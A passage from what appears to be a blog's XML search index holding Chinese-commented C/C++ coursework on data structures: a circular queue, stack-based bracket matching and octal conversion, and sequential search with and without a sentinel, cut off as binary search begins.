class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXQSIZE 100</span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 定义顺序队列</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> *base;   <span class="hljs-comment">//分配存储空间 </span><br><span class="hljs-type">int</span> front;  <span class="hljs-comment">//队头指针 </span><br><span class="hljs-type">int</span> rear;  <span class="hljs-comment">//队尾指针 </span><br>&#125;SqQueue;<br><br><br><span class="hljs-comment">//初始化循环队列 </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InitQueue</span><span class="hljs-params">(SqQueue &amp;Q)</span><br>&#123;<br>Q.base = new <span class="hljs-type">int</span>[MAXQSIZE];   <span class="hljs-comment">//分配存储空间</span><br><span class="hljs-keyword">if</span> (!Q.base)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;     <span class="hljs-comment">// 存储空间分配失败 </span><br>Q.front = Q.rear = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 求队列的长度</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">QueueLength</span><span class="hljs-params">(SqQueue Q)</span><br>&#123;<br><span class="hljs-keyword">return</span> ((Q.rear - Q.front) + MAXQSIZE) % MAXQSIZE;<br>&#125;<br><br><br><span class="hljs-comment">// 入队操作</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">EnQueue</span><span class="hljs-params">(SqQueue &amp;Q, <span class="hljs-type">int</span> e)</span><br>&#123;<br><span class="hljs-comment">//首先判断队列是否已满</span><br><span class="hljs-keyword">if</span> ((Q.rear + <span class="hljs-number">1</span>) % MAXQSIZE == Q.front)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>Q.base[Q.rear] = e;  <span class="hljs-comment">// 新元素插入队尾</span><br>Q.rear = (Q.rear + <span class="hljs-number">1</span>) % MAXQSIZE;   <span class="hljs-comment">// 队尾指针加1</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">//出队操作</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">DeQueue</span><span class="hljs-params">(SqQueue &amp;Q, <span class="hljs-type">int</span> &amp;e)</span><br>&#123;<br><span class="hljs-keyword">if</span> (Q.front == Q.rear)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>e = Q.base[Q.front];  <span class="hljs-comment">// 保存队头元素</span><br>Q.front = (Q.front + <span class="hljs-number">1</span>) % MAXQSIZE;  <span class="hljs-comment">// 队头指针加1</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 取队头元素</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">GetHead</span><span class="hljs-params">(SqQueue Q)</span><span class="hljs-comment">// 返回Q的队头元素, 不修改队头指针</span><br>&#123;<br><span class="hljs-keyword">if</span> (Q.front != Q.rear)   <span class="hljs-comment">// 队列非空</span><br><span class="hljs-keyword">return</span> Q.base[Q.front];  <span class="hljs-comment">// 返回队头元素的值,队头指针不变</span><br>&#125;<br><br><span class="hljs-comment">//遍历队列</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">TraveQueue</span><span class="hljs-params">(SqQueue Q)</span><br>&#123;<br><span class="hljs-type">int</span> len = QueueLength(Q);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>&#123;<br><span class="hljs-type">int</span> e;<br>DeQueue(Q, e);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, e);<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>SqQueue Q;<br><br><span class="hljs-keyword">if</span> (InitQueue(Q))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列初始化成功!\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列初始化失败!\n&quot;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列的初始长度是:%d\n&quot;</span>, QueueLength(Q));<br><br><span class="hljs-comment">// 入队</span><br><span class="hljs-type">int</span> n;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入队元素的个数:&quot;</span>);<br>scanf_s(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-type">int</span> e;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入第%d个元素的值:&quot;</span>, i + <span class="hljs-number">1</span>);<br>scanf_s(<span class="hljs-string">&quot;%d&quot;</span>, &amp;e);<br>EnQueue(Q, e);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列的长度是:%d\n&quot;</span>, QueueLength(Q));<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;遍历队列:&quot;</span>);<br>TraveQueue(Q);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n队头元素:%d\n&quot;</span>, GetHead(Q));<br><br><span class="hljs-comment">// 出队</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++)<br>&#123;<br><span class="hljs-type">int</span> e;<br>DeQueue(Q, e);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第%d个出队元素的值:%d\n&quot;</span>, i + <span class="hljs-number">1</span>, e);<br>&#125;<br><br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1>栈的应用</h1><h5 id="括号的匹配">括号的匹配</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">Matching</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">stack</span>&lt;<span class="hljs-type">char</span>&gt; s;  <span class="hljs-comment">// 定义一个stack容器</span><br><span class="hljs-type">char</span> ch, temp;<br><span class="hljs-type">int</span> flag = <span class="hljs-number">1</span>;     <span class="hljs-comment">// 标记匹配结果以控制循环及返回结果</span><br><br><span class="hljs-built_in">cin</span> &gt;&gt; ch; <span class="hljs-comment">//读入第一个字符</span><br><br><span class="hljs-keyword">while</span> (ch != <span class="hljs-string">&#x27;#&#x27;</span> &amp;&amp; flag) <span class="hljs-comment">//假设表达式以“#”结尾</span><br>&#123;<br><span class="hljs-keyword">switch</span> (ch)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;(&#x27;</span>:      <span class="hljs-comment">// 若是左括号，则将其压入栈</span><br>s.push(ch);<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;)&#x27;</span>:  <span class="hljs-comment">//若是“)”，则根据当前栈顶元素的值分情况考虑</span><br><span class="hljs-keyword">if</span> (!s.empty() &amp;&amp; s.top() == <span class="hljs-string">&#x27;(&#x27;</span>)  <span class="hljs-comment">// 若栈非空且栈顶元素是“(”，则正确匹配</span><br>&#123;<br>temp = s.top();<br>s.pop();<br>&#125;<br><span class="hljs-keyword">else</span><br>flag = <span class="hljs-number">0</span>;    <span class="hljs-comment">// 若栈空或栈顶元素不是“(”，则错误失败</span><br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;]&#x27;</span>: <span class="hljs-comment">//若是“]”，则根据当前栈顶元素的值分情况考虑</span><br><span class="hljs-keyword">if</span> (!s.empty() &amp;&amp; s.top() == <span class="hljs-string">&#x27;[&#x27;</span>) <span class="hljs-comment">// 若栈非空且栈顶元素是“[”，则正确匹配</span><br>&#123;<br>temp = s.top();<br>s.pop();<br>&#125;<br><span class="hljs-keyword">else</span><br>flag = <span class="hljs-number">0</span>;         <span class="hljs-comment">//若栈空或栈顶元素不是“[”，则错误匹配</span><br><span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-comment">//switch</span><br><span class="hljs-built_in">cin</span> &gt;&gt; ch; <span class="hljs-comment">//继续读入下一个字符</span><br>&#125; <span class="hljs-comment">//while</span><br><span class="hljs-keyword">if</span> (s.empty() &amp;&amp; flag)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;         <span class="hljs-comment">// 匹配成功</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;      <span class="hljs-comment">// 匹配失败</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入待匹配的表达式，以“#”结束：&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//int flag = (int)Matching();</span><br><span class="hljs-keyword">if</span> (Matching())<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;括号匹配成功！&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;括号匹配失败！&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="进制转换">进制转换</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 链栈的存储结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">StackNode</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">StackNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;StackNode, *LinkStack;<br><br><span class="hljs-comment">// 初始化</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InitStack</span><span class="hljs-params">(LinkStack &amp;S)</span><br>&#123;<br>S = <span class="hljs-literal">NULL</span>;   <span class="hljs-comment">// 将栈顶指针置空</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 入栈</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(LinkStack &amp;S, <span class="hljs-type">int</span> e)</span><br>&#123;<br><span class="hljs-comment">//元素e入栈</span><br>StackNode *p;<br>p = new StackNode;  <span class="hljs-comment">// 生成新节点</span><br><br>p-&gt;data = e;        <span class="hljs-comment">// 将新节点数据域置为e</span><br>p-&gt;next = S;        <span class="hljs-comment">// 将新节点插入栈顶</span><br>S = p;             <span class="hljs-comment">// 修改栈顶指针</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;         <span class="hljs-comment">// 链栈要注意指针的方向是从栈顶指向栈底的 </span><br>&#125;<br><br><span class="hljs-comment">// 出栈</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Pop</span><span class="hljs-params">(LinkStack &amp;S, <span class="hljs-type">int</span> &amp;e)</span><br>&#123;<br><span class="hljs-keyword">if</span> (S == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-comment">// 栈空</span><br>&#125;<br>e = S-&gt;data;    <span class="hljs-comment">//将栈顶元素赋值给e</span><br>StackNode *p;<br>p = S;         <span class="hljs-comment">// 临时保存栈顶元素空间，准备释放</span><br>S = S-&gt;next;    <span class="hljs-comment">// 修改栈顶指针</span><br>delete p;     <span class="hljs-comment">// 释放原栈顶元素空间</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><br><span class="hljs-comment">// 数制的转换(链栈实现)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">conversion</span><span class="hljs-params">(<span class="hljs-type">int</span> N)</span><br>&#123;<span class="hljs-comment">//对于任意一个非负十进制数，打印输出与其等值的八进制数</span><br><span class="hljs-type">int</span> e;<br>LinkStack S;<br><span class="hljs-keyword">if</span> (InitStack(S))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链栈S初始化成功!\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链栈S初始化失败!\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">while</span> (N) <span class="hljs-comment">//当N非零时,循环</span><br>&#123;<br>Push(S, N % <span class="hljs-number">8</span>);    <span class="hljs-comment">// 把N与8求余得到的八进制数压入栈S</span><br>N = N / <span class="hljs-number">8</span>;      <span class="hljs-comment">// N更新为N与8的商</span><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;转化为八进制数是:&quot;</span>);<br><span class="hljs-keyword">while</span> (S) <span class="hljs-comment">// 当栈S非空时，循环</span><br>&#123;<br>Pop(S, e); <span class="hljs-comment">//弹出栈顶元素e</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, e); <span class="hljs-comment">//输出e</span><br>&#125;<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入一个十进制数:&quot;</span>);<br>scanf_s(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br><br>conversion(n);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>code-查找</title>
    <link href="/2022/02/18/code-%E6%9F%A5%E6%89%BE/"/>
    <url>/2022/02/18/code-%E6%9F%A5%E6%89%BE/</url>
    
    <content type="html"><![CDATA[<h1>顺序查找</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1;</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">int</span> key;<span class="hljs-comment">//关键字域</span><br>&#125;ElemType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>ElemType *R;<br><span class="hljs-type">int</span> length;<br>&#125;SSTable;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">InitList_SSTable</span><span class="hljs-params">(SSTable &amp;L)</span><br>&#123;<br>L.R = new ElemType[MAXSIZE];<br><span class="hljs-keyword">if</span> (!L.R)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;初始化错误&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>L.length = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Insert_SSTable</span><span class="hljs-params">(SSTable &amp;L)</span><br>&#123;<br><span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAXSIZE; i++)<br>&#123;<br>L.R[i].key = j;<br>L.length++;<br>j++;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Search_Seq</span><span class="hljs-params">(SSTable ST, <span class="hljs-type">int</span> key)</span> &#123;<br><span class="hljs-comment">//在顺序表ST中顺序查找其关键字等于key的数据元素。若找到，则函数值为</span><br><span class="hljs-comment">//该元素在表中的位置，否则为0</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = ST.length; i &gt;= <span class="hljs-number">1</span>; --i)<br><span class="hljs-keyword">if</span> (ST.R[i].key == key) <span class="hljs-keyword">return</span> i;<span class="hljs-comment">//从后往前找        </span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<span class="hljs-comment">// Search_Seq</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Show_End</span><span class="hljs-params">(<span class="hljs-type">int</span> result, <span class="hljs-type">int</span> testkey)</span><br>&#123;<br><span class="hljs-keyword">if</span> (result == <span class="hljs-number">0</span>)<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;未找到&quot;</span> &lt;&lt; testkey &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;找到&quot;</span> &lt;&lt; testkey &lt;&lt; <span class="hljs-string">&quot;位置为&quot;</span> &lt;&lt; result &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>SSTable ST;<br>InitList_SSTable(ST);<br>Insert_SSTable(ST);<br><span class="hljs-type">int</span> testkey1 = <span class="hljs-number">7</span>, testkey2 = <span class="hljs-number">200</span>;<br><span class="hljs-type">int</span> result;<br>result = Search_Seq(ST, testkey1);<br>Show_End(result, testkey1);<br>result = Search_Seq(ST, testkey2);<br>Show_End(result, testkey2);<br>&#125;<br></code></pre></td></tr></table></figure><h1>设置监视哨的顺序查找</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1;</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">int</span> key;<span class="hljs-comment">//关键字域</span><br>&#125;ElemType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>ElemType *R;<br><span class="hljs-type">int</span> length;<br>&#125;SSTable;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">InitList_SSTable</span><span class="hljs-params">(SSTable &amp;L)</span><br>&#123;<br>L.R = new ElemType[MAXSIZE];<br><span class="hljs-keyword">if</span> (!L.R)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;初始化错误&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>L.length = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Insert_SSTable</span><span class="hljs-params">(SSTable &amp;L)</span><br>&#123;<br><span class="hljs-type">int</span> j = <span class="hljs-number">1</span>;<span class="hljs-comment">//空出ST.R[0]的位置</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; MAXSIZE; i++)<br>&#123;<br>L.R[i].key = j;<br>L.length++;<br>j++;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Search_Seq</span><span class="hljs-params">(SSTable ST, <span class="hljs-type">int</span> key)</span> &#123;<br><span class="hljs-comment">//在顺序表ST中顺序查找其关键字等于key的数据元素。若找到，则函数值为</span><br><span class="hljs-comment">//该元素在表中的位置，否则为0</span><br>ST.R[<span class="hljs-number">0</span>].key = key;                <br><span class="hljs-comment">//“哨兵”</span><br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span> (i = ST.length; ST.R[i].key != key; --i);<span class="hljs-comment">//从后往前找</span><br><span class="hljs-keyword">return</span> i;<br>&#125;<span class="hljs-comment">// Search_Seq</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Show_End</span><span class="hljs-params">(<span class="hljs-type">int</span> result, <span class="hljs-type">int</span> testkey)</span><br>&#123;<br><span class="hljs-keyword">if</span> (result == <span class="hljs-number">0</span>)<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;未找到&quot;</span> &lt;&lt; testkey &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;找到&quot;</span> &lt;&lt; testkey &lt;&lt; <span class="hljs-string">&quot;位置为&quot;</span> &lt;&lt; result &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>SSTable ST;<br>InitList_SSTable(ST);<br>Insert_SSTable(ST);<br><span class="hljs-type">int</span> testkey1 = <span class="hljs-number">7</span>, testkey2 = <span class="hljs-number">200</span>;<br><span class="hljs-type">int</span> result;<br>result = Search_Seq(ST, testkey1);<br>Show_End(result, testkey1);<br>result = Search_Seq(ST, testkey2);<br>Show_End(result, testkey2);<br>&#125;<br></code></pre></td></tr></table></figure><h1>折半查找</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 